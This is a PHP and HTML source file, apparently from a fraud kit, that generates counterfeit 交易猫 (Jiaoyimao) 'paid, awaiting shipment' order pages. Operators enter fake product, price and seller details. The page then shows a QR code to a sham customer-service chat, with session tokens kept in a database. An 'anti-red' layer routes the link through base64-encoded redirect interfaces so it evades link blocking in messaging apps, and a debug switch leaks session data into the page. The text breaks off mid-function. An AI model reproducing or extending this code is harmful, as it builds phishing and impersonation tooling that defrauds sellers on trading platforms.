<?php
if (!defined('FROM_ROUTER')) {
    http_response_code(403);
    exit('喜乐科技@x60898');
}
session_start();
require_once $_SERVER['DOCUMENT_ROOT'] . '/config/dbconfig.php';
checkLogin();

$currentAgent = $_SESSION['username'];

function generateCustomerName($length = 6) {
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}
// 生成XEDATA令牌
function generateXEDataToken() {
    return md5(uniqid(mt_rand(), true));
}

// 创建会话记录到 XE-SKDJWKSNCDATA 表
function createChatSession($sessionId, $customerName, $agentAccount, $platform = '交易猫') {
    $db = getDB();
    if (!$db) return false;
    
    $xedataToken = generateXEDataToken();
    $expiresAt = date('Y-m-d H:i:s', strtotime('+7 days'));
    
    $stmt = $db->prepare("INSERT INTO `XE-SKDJWKSNCDATA` 
                         (session_id, xedata_token, customer_name, agent_account, expires_at, platform) 
                         VALUES (?, ?, ?, ?, ?, ?)");
    $stmt->bind_param("ssssss", $sessionId, $xedataToken, $customerName, $agentAccount, $expiresAt, $platform);
    
    if ($stmt->execute()) {
        return $xedataToken;
    }
    return false;
}


$customerName = generateCustomerName();
$sessionId = 'a' . $customerName . 'z-p' . $currentAgent . 's';
// 生成XEDATA令牌并保存到数据库
$xedataToken = createChatSession($sessionId, $customerName, $currentAgent, '交易猫');

$currentDomain = $_SERVER['HTTP_HOST'];
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
$baseUrl = $protocol . "://" . $currentDomain;
$originalServiceUrl = $baseUrl . '/' . "ChatMao" . '?id=' . $sessionId;

// 添加XEDATA参数
if ($xedataToken) {
    $originalServiceUrl .= '&XEDATA=' . $xedataToken;
}
// 获取防红配置（修复版，调整优先级）
function getAntiRedConfig($username) {
     $db = getDB();
    if (!$db) return null;
    
    // 1. 首先检查防红开关是否开启
    $stmt = $db->prepare("SELECT apply_status FROM user_anti_red_config WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $result = $stmt->get_result();
    $config = $result->fetch_assoc();
    
    if (!$config) {
        // 如果没有配置记录，默认防红开关开启
        $apply_status = 'on';
    } else {
        $apply_status = $config['apply_status'];
    }
    
    // 如果防红开关关闭，直接返回null
    if ($apply_status === 'off') {
        return null;
    }
    
    // 2. 防红开关开启的情况下，检查session中是否有应用的接口（付费或免费）
    if (isset($_SESSION['applied_api_url']) && !empty($_SESSION['applied_api_url'])) {
        $type = $_SESSION['applied_domain_type'] ?? 'paid';
        $applied_domain = $_SESSION['applied_domain'] ?? '付费接口';
        
        return [
            'api_url' => $_SESSION['applied_api_url'],
            'apply_status' => 'on',
            'applied_domain' => $applied_domain,
            'encoding_mode' => 'base64',
            'type' => $type
        ];
    }
    
    // 3. 检查session中是否有自定义接口
    if (isset($_SESSION['custom_interface_url']) && !empty($_SESSION['custom_interface_url'])) {
        return [
            'api_url' => $_SESSION['custom_interface_url'],
            'apply_status' => 'on',
            'applied_domain' => isset($_SESSION['custom_interface_remark']) ? $_SESSION['custom_interface_remark'] : '自定义接口',
            'encoding_mode' => isset($_SESSION['custom_encoding_mode']) ? $_SESSION['custom_encoding_mode'] : 'base64',
            'type' => 'custom'
        ];
    }
    
    // 4. 从数据库查询用户配置
    if ($config['apply_status'] === 'on' && !empty($config['applied_domain'])) {
        $applied_domain = $config['applied_domain'];
        
        // 先尝试从免费接口表中查找
        $freeStmt = $db->prepare("SELECT api_url FROM freeantired WHERE name = ? AND status = 'active'");
        $freeStmt->bind_param("s", $applied_domain);
        $freeStmt->execute();
        $freeResult = $freeStmt->get_result();
        
        if ($freeResult->num_rows > 0) {
            // 是免费接口
            $freeData = $freeResult->fetch_assoc();
            $config['api_url'] = $freeData['api_url'];
            $config['type'] = 'free';
            $config['encoding_mode'] = 'base64';
            return $config;
        }
        
        // 再尝试从付费接口表中查找
        $paidStmt = $db->prepare("SELECT api_url FROM anti_red_links WHERE domain_name = ? AND sold_to = ?");
        $paidStmt->bind_param("ss", $applied_domain, $username);
        $paidStmt->execute();
        $paidResult = $paidStmt->get_result();
        
        if ($paidResult->num_rows > 0) {
            // 是付费接口
            $paidData = $paidResult->fetch_assoc();
            $config['api_url'] = $paidData['api_url'];
            $config['type'] = 'paid';
            $config['encoding_mode'] = 'base64';
            return $config;
        }
        
        // 如果都不是，检查是否是自定义接口（在 userantired 表中）
        $customStmt = $db->prepare("SELECT ua.api_url, ua.encoding 
                                    FROM userantired ua 
                                    JOIN users u ON ua.user_id = u.id 
                                    WHERE u.username = ? AND ua.remark = ? AND ua.status = 'active'");
        $customStmt->bind_param("ss", $username, $applied_domain);
        $customStmt->execute();
        $customResult = $customStmt->get_result();
        
        if ($customResult->num_rows > 0) {
            // 是自定义接口
            $customData = $customResult->fetch_assoc();
            $config['api_url'] = $customData['api_url'];
            $config['encoding_mode'] = $customData['encoding'] ?? 'base64';
            $config['type'] = 'custom';
            return $config;
        }
    }
    
    return null;
}

$antiRedConfig = getAntiRedConfig($currentAgent);
$serviceUrl = $originalServiceUrl;

// 读取源站URL配置
$db = getDB();
$webconfigResult = $db->query("SELECT site_url, site_url_enabled FROM webconfig ORDER BY id DESC LIMIT 1");
$siteUrlConfig = null;
if ($webconfigResult && $webconfigResult->num_rows > 0) {
    $siteUrlConfig = $webconfigResult->fetch_assoc();
}

if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on' && !empty($antiRedConfig['api_url'])) {
    $encoding_mode = $antiRedConfig['encoding_mode'] ?? 'base64';
    
    // 根据编码模式处理URL
    switch ($encoding_mode) {
        case 'base64':
            $encodedUrl = base64_encode($originalServiceUrl);
            break;
        case 'urlencode':
        case 'url':
            $encodedUrl = urlencode($originalServiceUrl);
            break;
        case 'none':
        default:
            $encodedUrl = $originalServiceUrl;
            break;
    }
    
    $serviceUrl = $antiRedConfig['api_url'] . $encodedUrl;
    
    // 调试信息
    error_log("防红接口应用信息: " . json_encode([
        'type' => $antiRedConfig['type'] ?? 'unknown',
        'applied_domain' => $antiRedConfig['applied_domain'] ?? 'unknown',
        'api_url' => $antiRedConfig['api_url'],
        'encoding_mode' => $encoding_mode,
        'original_url' => $originalServiceUrl,
        'encoded_url' => $encodedUrl,
        'final_url' => $serviceUrl
    ]));
} elseif ($siteUrlConfig && !empty($siteUrlConfig['site_url_enabled']) && !empty($siteUrlConfig['site_url'])) {
    $serviceUrl = $siteUrlConfig['site_url'] . base64_encode($originalServiceUrl);
}

// 输出调试信息（开发环境中使用）
if (isset($_GET['debug'])) {
    echo "<!-- 防红配置信息: " . json_encode($antiRedConfig) . " -->\n";
    echo "<!-- 原始URL: $originalServiceUrl -->\n";
    echo "<!-- 最终URL: $serviceUrl -->\n";
    echo "<!-- Session状态: " . json_encode([
        'custom_interface_url' => $_SESSION['custom_interface_url'] ?? '未设置',
        'custom_encoding_mode' => $_SESSION['custom_encoding_mode'] ?? '未设置',
        'custom_interface_remark' => $_SESSION['custom_interface_remark'] ?? '未设置',
        'applied_api_url' => $_SESSION['applied_api_url'] ?? '未设置',
        'applied_domain' => $_SESSION['applied_domain'] ?? '未设置',
        'applied_domain_type' => $_SESSION['applied_domain_type'] ?? '未设置',
        'redirect_to_browser' => $_SESSION['redirect_to_browser'] ?? '未设置'
    ]) . " -->\n";
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>分享页</title>
	
	<link rel="stylesheet" href="/assets/bootstrap-icons.css">
    <link rel="stylesheet" href="/assets/SharePhoto/main.css">
    <link rel="stylesheet" href="/assets/SharePhoto/jiaoyimao.css">

</head>
<body> 
    <div id="app" data-v-app="">
		<div class="app-container">
			<div class="scroll-container">
				<div class="form-container">
					<div class="form-row">
                    <label>防红</label>
                    <a class="form-link anti-red-link" id="anti-red-status">
                            <?php 
                            if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on') {
                                echo '已配置 (' . $antiRedConfig['applied_domain'] . ')';
                            } else {
                                echo '未配置';
                            }
                            ?> </a>
                         <!-- 移除刷新按钮 -->
                    <div class="copy-link-btn" id="copy-link-btn">
                        <svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="18" height="18">
                            <path
                                d="M761.088 715.3152a38.7072 38.7072 0 0 1 0-77.4144 37.4272 37.4272 0 0 0 37.4272-37.4272V265.0112a37.4272 37.4272 0 0 0-37.4272-37.4272H425.6256a37.4272 37.4272 0 0 0-37.4272 37.4272 38.7072 38.7072 0 1 1-77.4144 0 115.0976 115.0976 0 0 1 114.8416-114.8416h335.4624a115.0976 115.0976 0 0 1 114.8416 114.8416v335.4624a115.0976 115.0976 0 0 1-114.8416 114.8416z"
                                p-id="5993" fill="#515151"></path>
                            <path
                                d="M589.4656 883.0976H268.1856a121.1392 121.1392 0 0 1-121.2928-121.2928v-322.56a121.1392 121.1392 0 0 1 121.2928-121.344h321.28a121.1392 121.1392 0 0 1 121.2928 121.2928v322.56c1.28 67.1232-54.1696 121.344-121.2928 121.344zM268.1856 395.3152a43.52 43.52 0 0 0-43.8784 43.8784v322.56a43.52 43.52 0 0 0 43.8784 43.8784h321.28a43.52 43.52 0 0 0 43.8784-43.8784v-322.56a43.52 43.52 0 0 0-43.8784-43.8784z"
                                p-id="5994" fill="#515151"></path>
                        </svg>
                        <div>复制链接</div>
                    </div>
                </div>
					<div class="form-row">
						<label>标题</label>
						<input type="text" id="title-input" placeholder="请输入商品标题">
					</div>
					<div class="form-row">
						<label>价格</label>
						<input type="text" id="price-input" placeholder="请输入价格">
					</div>
					<div class="form-row">
						<label>卖家昵称</label>
						<input type="text" id="seller-nickname" placeholder="请输入卖家昵称">
					</div>
					<div class="form-row">
						<label>卖家头像</label>
						<div class="avatar-upload-container">
							<img id="seller-avatar-preview" class="avatar-preview" src="" alt="卖家头像">
							<div class="avatar-actions">
								<label for="seller-avatar-upload" class="avatar-btn">上传头像</label>
								<button id="random-avatar-btn" class="avatar-btn">随机头像</button>
							</div>
							<input type="file" accept="image/*" id="seller-avatar-upload" style="display: none;">
						</div>
					</div>
					<div class="form-row">
						<label>封面图</label>
						<label for="upload-cover" class="form-link" id="upload-label">上传图片</label>
						<input type="file" accept="image/*" id="upload-cover" style="display: none;">
					</div>
				</div>
				<!-- 预览区域开始 -->
				<div class="XE-main">
					<div class="XE-container">
						<div class="XE-header">
							<svg class="XE-back-button" t="1767018700016" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="4966" width="24" height="24">
								<path
									d="M365.251036 516.036371l416.603946-416.603945A58.532854 58.532854 0 0 1 698.013437 17.673902L242.352872 473.334467a58.324552 58.324552 0 0 0 0 82.800034l5.728304 4.686795L693.847398 1007.108272a57.283043 57.283043 0 0 0 81.237769 0 56.762288 56.762288 0 0 0 0-80.717014z"
									fill="#333333" p-id="4967"></path>
							</svg>
							<div class="XE-title">已付款，待卖家发货</div>
						</div>
						<div class="XE-card">
							<div class="XE-badge">本订单由交易猫平台交易员发货</div>
							<div class="XE-card-content">
								<div class="XE-section-title">平台发货<span class="XE-subtitle">专业交易员服务，更安心</span></div>
								<div class="XE-progress-container">
									<div class="XE-progress-line"></div>
									<div class="XE-progress-active"></div>
									<div class="XE-step XE-step-active">
										<div class="XE-step-icon">
											<svg t="1767018815660" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="7343" width="20" height="20">
												<path
													d="M856.006891 49.877991 793.57805 49.877991c-17.263176 0-37.193087 10.472516-37.193087 27.492144s19.929912 34.038234 37.193087 34.038234l62.428841 0c37.190017 0 62.425771 24.877597 62.425771 61.530378l0 708.23636c0 36.652781-25.235754 61.530378-62.425771 61.530378L183.931103 942.705486c-37.185924 0-78.360695-24.877597-78.360695-61.530378L105.570407 172.937724c0-36.652781 25.232684-61.530378 62.425771-61.530378l78.363765 0c17.270339 0 23.907503-17.019629 23.907503-34.038234s-6.638187-27.492144-23.907503-27.492144l-78.363765 0c-87.661525 0-124.853589 53.674457-124.853589 124.365472l0 700.384531c0 75.928297 46.486754 129.603777 131.494846 129.603777l674.722058 0c85.011162 0 131.497916-44.51382 131.497916-129.603777L980.857411 174.243463C980.857411 103.552447 937.03023 49.877991 856.006891 49.877991L856.006891 49.877991 856.006891 49.877991zM246.359944 327.412958c0 17.022699 14.609743 31.420617 31.873941 31.420617l468.857411 0c17.266245 0 31.880081-14.398942 31.880081-31.420617 0-17.019629-14.613836-31.420617-31.880081-31.420617L278.233885 295.992341C260.969687 295.991318 246.359944 310.393329 246.359944 327.412958L246.359944 327.412958 246.359944 327.412958zM745.766115 466.180442 278.233885 466.180442c-17.263176 0-31.873941 14.402011-31.873941 31.42471 0 17.015535 14.609743 31.414477 31.873941 31.414477l468.857411 0c17.266245 0 31.880081-14.398942 31.880081-31.414477C777.646196 479.273644 763.029290 466.180442 745.766115 466.180442L745.766115 466.180442 745.766115 466.180442zM745.766115 650.767484 278.233885 650.767484c-17.263176 0-31.873941 14.402011-31.873941 31.417547 0 17.019629 14.609743 31.417547 31.873941 31.417547l468.857411 0c17.266245 0 31.880081-14.398942 31.880081-31.417547C777.646196 663.860686 763.029290 650.767484 745.766115 650.767484L745.766115 650.767484 745.766115 650.767484zM404.415726 127.118166l217.828121 0c25.235754 0 46.486754-24.871457 46.486754-53.674457 0-28.79686-21.251-53.674457-47.818075-53.674457L404.415726 19.769252c-26.564006 0-47.811936 24.874527-47.811936 53.674457C356.603791 102.246709 377.851721 127.118166 404.415726 127.118166L404.415726 127.118166 404.415726 127.118166zM404.415726 127.118166"
													fill="#272636" p-id="7344"></path>
											</svg>
										</div>
										<div class="XE-step-label">已下单</div>
									</div>
									<div class="XE-step">
										<div class="XE-step-icon">
											<svg t="1767018920348" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8519" width="20" height="20">
												<path
													d="M738.1 880c-58.3 0-105.7-47.4-105.7-105.7 0-4.1 0.2-8.2 0.7-12.2H450.3c-2.4 1.2-5 1.9-7.9 1.9H384c-6 52.7-50.8 93.7-105 93.7s-99.1-41-105.1-93.7H116c-4.6 0-9.1-1.8-12.4-5.1-3.3-3.3-5.1-7.7-5.1-12.4V473.8c0-3.3 0.9-6.4 2.5-9.1l93.8-153.2c22.1-35.1 54.8-52.7 97.3-52.7h133.2c3-64.4 56.3-115.9 121.4-115.9h259.7c67 0 121.5 54.5 121.5 121.5v402c0 49.1-37.2 89.7-84.9 95 0.5 4.2 0.7 8.5 0.7 12.8 0.1 58.4-47.3 105.7-105.6 105.8z m0-176.4c-38.9 0-70.7 31.8-70.7 70.7 0 38.9 31.8 70.7 70.7 70.7 38.9 0 70.7-31.8 70.7-70.7-0.1-39-31.8-70.7-70.7-70.7zM279 681.1c-39 0-70.7 31.8-70.7 70.7 0 38.9 31.8 70.7 70.7 70.7 38.9 0 70.7-31.8 70.7-70.7-0.1-38.9-31.8-70.7-70.7-70.7z m0-35c50.4 0 92.7 35.5 103.2 82.8 0.8-0.1 1.5-0.2 2.4-0.2h40.3l0.2-434.9h-133c-30.5 0-51.9 11.5-67.5 36.1l-91 148.8v250.1h42.2c10.5-47.3 52.8-82.7 103.2-82.7z m181.2 80.8h183.3c17.3-34.6 53.2-58.4 94.5-58.4 41.4 0 77.2 23.8 94.5 58.4 33.2-0.1 60.3-27.2 60.3-60.5v-402c0-47.6-38.8-86.4-86.4-86.4H546.7c-47.6 0-86.4 38.8-86.4 86.4l-0.1 462.5zM317.5 495.3H205.6c-4.6 0-9.1-1.8-12.4-5.1-3.3-3.3-5.1-7.7-5.1-12.4 0-9.7 7.8-17.5 17.5-17.5H300v-94.4c0-9.7 7.8-17.5 17.5-17.5s17.5 7.8 17.5 17.5v111.9c0 9.7-7.8 17.5-17.5 17.5z m0 0"
													fill="#333333" p-id="8520"></path>
											</svg>
										</div>
										<div class="XE-step-label">卖家配合</div>
									</div>
									<div class="XE-step">
										<div class="XE-step-icon">
											<svg t="1767019002898" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="9630" width="20" height="20">
												<path
													d="M448 917.376C448 917.333333 576 917.333333 576 917.333333c0.085333 0 0-42.709333 0-42.709333C576 874.666667 448 874.666667 448 874.666667c-0.085333 0 0 42.709333 0 42.709333z m371.349333-173.034667C809.6 745.877333 799.573333 746.666667 789.333333 746.666667a21.333333 21.333333 0 0 1-21.333333-21.333334V384a21.333333 21.333333 0 0 1 21.333333-21.333333 191.146667 191.146667 0 0 1 92.373334 23.637333C828.202667 234.517333 681.045333 128 511.296 128 341.290667 128 193.749333 234.816 140.458667 387.328A191.125333 191.125333 0 0 1 234.666667 362.666667a21.333333 21.333333 0 0 1 21.333333 21.333333v341.333333a21.333333 21.333333 0 0 1-21.333333 21.333334 192 192 0 0 1-148.906667-313.216 21.269333 21.269333 0 0 1 0.042667-8.682667C127.36 228.288 304.469333 85.333333 511.274667 85.333333c209.706667 0 388.544 146.944 427.008 347.093334l0.213333 1.344A191.210667 191.210667 0 0 1 981.333333 554.666667c0 70.4-37.909333 131.968-94.421333 165.397333-57.642667 100.693333-154.752 174.762667-268.778667 204.074667A42.517333 42.517333 0 0 1 576 960h-128c-23.573333 0-42.666667-19.157333-42.666667-42.624v-42.752c0-23.552 18.922667-42.624 42.666667-42.624h128c23.573333 0 42.666667 19.157333 42.666667 42.624v5.141333a392.810667 392.810667 0 0 0 200.682666-135.424zM85.333333 554.666667c0.298667 133.589333 128 148.949333 128 148.949333V406.144s-128.298667 14.933333-128 148.522667z m853.333334 0c0.298667-133.589333-128-148.522667-128-148.522667v297.472s127.701333-15.36 128-148.949333z"
													fill="#3D3D3D" p-id="9631"></path>
											</svg>
										</div>
										<div class="XE-step-label">交易员发货</div>
									</div>
									<div class="XE-step">
										<div class="XE-step-icon">
											<svg t="1767019029789" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="10681" width="20" height="20">
												<path
													d="M326.1184 569.0624c-0.6912 0.896-1.3312 1.7664-1.6384 2.8672l-50.9952 193.024c-2.9696 11.2384 0.0512 23.3472 8.1408 31.872 5.9904 6.0672 13.9776 9.4208 22.4256 9.4208 2.7648 0 5.6064-0.3328 8.32-1.0752l185.6768-52.3008c0.2816 0 0.4352 0.2304 0.6912 0.2304 2.1248 0 4.224-0.7936 5.7856-2.4576L1001.088 238.2592c14.7712-15.2576 22.8352-36.0192 22.8352-58.5984 0-25.6-10.496-51.2-28.9536-70.1696l-46.8992-48.512c-18.4064-18.9952-43.2384-29.8752-68.0192-29.8752-21.888 0-41.984 8.32-56.8064 23.552L326.8608 567.296C326.3232 567.7824 326.5024 568.4992 326.1184 569.0624M952.5504 188.1088l-49.3056 50.8672-79.9744-83.8144 48.6144-50.2016c7.68-7.9616 22.5792-6.8096 31.3856 2.3808l46.9248 48.4608c4.864 5.0432 7.68 11.8016 7.68 18.4064C957.9008 179.6608 956.0064 184.5504 952.5504 188.1088M414.4128 577.1008 772.736 207.3088l79.9744 83.8912L495.0784 660.2752 414.4128 577.1008zM349.1072 727.04l25.9328-98.0992 69.0688 71.296L349.1072 727.04zM956.7744 391.168c-18.7904 0-35.3536 15.7696-35.4304 35.4304l0 479.4624c0 25.088-19.712 44.4672-44.032 44.4672L113.5872 950.528c-24.32 0-42.3936-19.4304-42.3936-44.4672L71.1936 116.9664c0-25.088 18.0736-43.9552 42.3936-43.9552l524.1344 0c18.8672 0 34.2528-17.3568 34.2528-36.8384s-15.3856-36.224-34.2528-36.224L108.3648-0.0512c-59.1616 0-108.3904 50.56-108.3904 111.6672l0 799.8208c0 61.1072 49.1776 112.512 108.3904 112.512l774.144 0c59.264 0 109.6448-51.4048 109.6448-112.512L992.1536 426.368C992.0768 406.912 975.5648 391.168 956.7744 391.168"
													fill="#2c2c2c" p-id="10682"></path>
											</svg>
										</div>
										<div class="XE-step-label">完成</div>
									</div>
								</div>
							</div>
							<div class="XE-info-section">
								<div class="XE-info-title">交易员已接单，请联系卖家扫码配合</div>
								<div class="XE-notice-container">
									<div class="XE-notice-text">注意：为保障高峰时段系统稳定运行及用户体验，平台将在订单量激增期间动态调整订单显示规则，<span>可能不会显示订单</span></div>
									<div id="qrcode"></div>
								</div>
								<div class="XE-primary-button">联系交易员</div>
							</div>
						</div>
						<div class="XE-card XE-card-compact">
							<div class="XE-user-info">
								<img id="preview-seller-avatar" class="XE-avatar" src="" alt="卖家头像">
								<div class="XE-username" id="preview-seller-nickname">卖家昵称</div>
							</div>
							<div class="XE-order-item">
								<div class="XE-product-image" id="preview-image">
									<img src="/assets/img/chunse.png" alt="商品图片" style="width:100%;height:100%;object-fit:cover;">
								</div>
								<div class="XE-product-info">
									<div class="XE-product-title" id="preview-title">商品标题</div>
									<div class="XE-price-container">
										<div class="XE-price-amount">
											<span class="XE-currency">
												<span class="XE-currency-symbol">¥</span>
												<span class="XE-price-integer" id="preview-price">0</span>
											</span>
										</div>
										<div class="XE-quantity">x 1</div>
									</div>
								</div>
							</div>
							<div class="XE-summary-row XE-total-price">
								<div class="XE-summary-label">实付款</div>
								<div class="XE-total-amount">
									<div class="XE-amount-wrapper">
										<span class="XE-currency-symbol">￥</span>
										<span class="XE-price-integer" id="preview-price2">0</span>
									</div>
								</div>
							</div>
							<div class="XE-summary-row">
								<div class="XE-order-label">订单号</div>
								<div class="XE-order-number" id="preview-order-number">283847438902931</div>
							</div>
							<div class="XE-summary-row XE-more-button">查看更多</div>
						</div>
					</div>
				</div>
				<!-- 预览区域结束 -->
			</div>
		</div>
	</div>
	<script src="/assets/qrcode.min.js"></script>
	<script src="/assets/qrcode-helper.js"></script>
	<script>
		// 预制的动漫风格头像URL列表
		const animeAvatars = [
		    '/assets/img/suiji/avatar1.jpg',
		    '/assets/img/suiji/avatar2.jpg',
		    '/assets/img/suiji/avatar3.jpg',
		    '/assets/img/suiji/avatar4.jpg',
		    '/assets/img/suiji/avatar5.jpg',
		    '/assets/img/suiji/avatar6.jpg',
		    '/assets/img/suiji/avatar7.jpg',
		    '/assets/img/suiji/avatar8.jpg',
		    '/assets/img/suiji/avatar9.jpeg',
		    '/assets/img/suiji/avatar10.jpg',
		    '/assets/img/suiji/avatar11.jpg',
		    '/assets/img/suiji/avatar12.jpg',
		    '/assets/img/suiji/avatar13.jpg',
		    '/assets/img/suiji/avatar14.jpeg',
		    '/assets/img/suiji/avatar15.jpg',
		    '/assets/img/suiji/avatar16.jpg',
		    '/assets/img/suiji/avatar17.jpeg',
		    '/assets/img/suiji/avatar18.jpg',
		    '/assets/img/suiji/avatar19.jpg',
		    '/assets/img/suiji/avatar20.jpg'
		];
		
		// 记录上一次使用的头像索引，避免连续出现相同头像
		let lastAvatarIndex = -1;
		
		// 获取随机动漫头像URL
		function getRandomAnimeAvatar() {
		    let randomIndex;
		    
		    // 确保不连续出现相同的头像
		    do {
		        randomIndex = Math.floor(Math.random() * animeAvatars.length);
		    } while (randomIndex === lastAvatarIndex && animeAvatars.length > 1);
		    
		    lastAvatarIndex = randomIndex;
		    return animeAvatars[randomIndex];
		}
		
		// 生成二维码 - 使用PHP动态生成的链接
		var qrCodeUrl = "<?php echo $serviceUrl; ?>";
		
		// 更新卖家头像显示
		function updateSellerAvatar() {
		    const randomAvatarUrl = getRandomAnimeAvatar();
		    
		    // 更新表单区域的头像预览
		    const sellerAvatarPreview = document.getElementById('seller-avatar-preview');
		    if (sellerAvatarPreview) {
		        sellerAvatarPreview.src = randomAvatarUrl;
		    }
		    
		    // 更新预览区域的卖家头像
		    const previewSellerAvatar = document.getElementById('preview-seller-avatar');
		    if (previewSellerAvatar) {
		        previewSellerAvatar.src = randomAvatarUrl;
		    }
		}
		
		document.addEventListener('DOMContentLoaded', function() {
		    // 生成客服二维码
		    var qrcodeContainer = document.getElementById("qrcode");
		    try {
		        new QRCode(qrcodeContainer, {
		            text: qrCodeUrl,
		            width: getQRSize(qrCodeUrl, 110),
		            height: getQRSize(qrCodeUrl, 110),
		            colorDark: "#000000",
		            colorLight: "#ffffff",
		            correctLevel: getQRCorrectLevel(qrCodeUrl)
		        });
		    } catch(e) {
		        console.error('QR码生成失败，尝试降级:', e);
		        try {
		            qrcodeContainer.innerHTML = '';
		            new QRCode(qrcodeContainer, {
		                text: qrCodeUrl,
		                width: 140,
		                height: 140,
		                colorDark: "#000000",
		                colorLight: "#ffffff",
		                correctLevel: QRCode.CorrectLevel.L
		            });
		        } catch(e2) {
		            qrcodeContainer.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;width:110px;height:110px;background:#f5f5f5;border-radius:8px;color:#999;font-size:12px;text-align:center;padding:10px;">二维码生成失败</div>';
		        }
		    }
		    
		    // 在二维码中间添加logo图标
		    var logoImg = document.createElement('img');
		    logoImg.src = '/assets/img/jym.ico';
		    logoImg.style.position = 'absolute';
		    logoImg.style.top = '50%';
		    logoImg.style.left = '50%';
		    logoImg.style.transform = 'translate(-50%, -50%)';
		    logoImg.style.width = '20px';
		    logoImg.style.height = '20px';
		    logoImg.style.borderRadius = '20px';
		    logoImg.style.background = 'white';
		    logoImg.style.padding = '2px';
		    logoImg.style.boxShadow = '0 0 4px rgba(0,0,0,0.2)';
		    qrcodeContainer.style.position = 'relative';
		    qrcodeContainer.appendChild(logoImg);
		    
		    // 获取DOM元素
		    const titleInput = document.getElementById('title-input');
		    const priceInput = document.getElementById('price-input');
		    const sellerNicknameInput = document.getElementById('seller-nickname');
		    const sellerAvatarUpload = document.getElementById('seller-avatar-upload');
		    const sellerAvatarPreview = document.getElementById('seller-avatar-preview');
		    const randomAvatarBtn = document.getElementById('random-avatar-btn');
		    const uploadCover = document.getElementById('upload-cover');
		    const uploadLabel = document.getElementById('upload-label');
		    
		    // 预览区域元素
		    const previewPrice = document.getElementById('preview-price');
		    const previewPrice2 = document.getElementById('preview-price2');
		    const previewImage = document.getElementById('preview-image').querySelector('img');
		    const previewTitle = document.getElementById('preview-title');
		    const previewSellerAvatar = document.getElementById('preview-seller-avatar');
		    const previewSellerNickname = document.getElementById('preview-seller-nickname');
		    
		    // 初始化随机头像
		    updateSellerAvatar();
		    
		    // 价格输入监听 - 不再添加"元"单位
		    priceInput.addEventListener('input', function() {
		        const price = this.value;
		        previewPrice.textContent = price || '0';
		        previewPrice2.textContent = price || '0';
		    });
		    
		    // 标题输入监听
		    titleInput.addEventListener('input', function() {
		        previewTitle.textContent = this.value || '商品标题';
		    });
		    
		    // 卖家昵称输入监听
		    sellerNicknameInput.addEventListener('input', function() {
		        previewSellerNickname.textContent = this.value || '卖家昵称';
		    });
		    
		    // 卖家头像上传监听
		    sellerAvatarUpload.addEventListener('change', function(e) {
		        const file = e.target.files[0];
		        if (file) {
		            const reader = new FileReader();
		            reader.onload = function(e) {
		                const avatarUrl = e.target.result;
		                
		                // 更新表单区域的头像预览
		                if (sellerAvatarPreview) {
		                    sellerAvatarPreview.src = avatarUrl;
		                }
		                
		                // 更新预览区域的卖家头像
		                if (previewSellerAvatar) {
		                    previewSellerAvatar.src = avatarUrl;
		                }
		            };
		            reader.readAsDataURL(file);
		        }
		    });
		    
		    // 随机头像按钮监听
		    randomAvatarBtn.addEventListener('click', function() {
		        updateSellerAvatar();
		    });
		    
		    // 封面图上传监听
		    uploadCover.addEventListener('change', function(e) {
		        const file = e.target.files[0];
		        if (file) {
		            const reader = new FileReader();
		            reader.onload = function(e) {
		                previewImage.src = e.target.result;
		                uploadLabel.textContent = '已上传';
		            };
		            reader.readAsDataURL(file);
		        }
		    });
		    
		    // 复制链接功能
		    var copyLinkBtn = document.getElementById('copy-link-btn');
		    if (copyLinkBtn) {
		        copyLinkBtn.addEventListener('click', function() {
		            copyToClipboard(qrCodeUrl);
		        });
		    }
		    
		    });
		
		// 复制函数
		function copyToClipboard(text) {
		    return new Promise(function(resolve, reject) {
		        if (navigator.clipboard && window.isSecureContext) {
		            navigator.clipboard.writeText(text).then(function() {
		                resolve(true);
		            }).catch(function(err) {
		                console.error('复制失败:', err);
		                fallbackCopy(text, resolve, reject);
		            });
		        } else {
		            fallbackCopy(text, resolve, reject);
		        }
		    }).then(function(success) {
		        if (success) {
		            showToast('链接已复制到剪贴板！', 'success');
		        } else {
		            showToast('复制失败，请手动复制', 'error');
		        }
		    });
		}
		
		function fallbackCopy(text, resolve, reject) {
		    var textArea = document.createElement("textarea");
		    textArea.value = text;
		    textArea.style.position = "fixed";
		    textArea.style.left = "-999999px";
		    textArea.style.top = "-999999px";
		    document.body.appendChild(textArea);
		    textArea.focus();
		    textArea.select();
		    try {
		        var successful = document.execCommand('copy');
		        document.body.removeChild(textArea);
		        resolve(successful);
		    } catch (err) {
		        console.error('复制失败:', err);
		        document.body.removeChild(textArea);
		        resolve(false);
		    }
		}
		
		// 通知函数
		function showToast(message, type) {
		    var container = document.getElementById('notification-container');
		    if (!container) {
		        container = document.createElement('div');
		        container.id = 'notification-container';
		        container.className = 'notification-container';
		        document.body.appendChild(container);
		    }
		
		    var toast = document.createElement('div');
		    toast.className = 'new-user-toast notification-enter-active';
		    if (type) {
		        toast.classList.add(type);
		    }
		
		    var icon = document.createElement('div');
		    icon.className = 'toast-icon';
		    icon.textContent = type === 'error' ? '!' : '✓';
		    toast.appendChild(icon);
		
		    var text = document.createElement('div');
		    text.className = 'toast-text';
		    text.textContent = message;
		    toast.appendChild(text);
		
		    var closeBtn = document.createElement('button');
		    closeBtn.className = 'toast-close';
		    closeBtn.innerHTML = '&times;';
		    closeBtn.addEventListener('click', function() {
		        removeToast(toast);
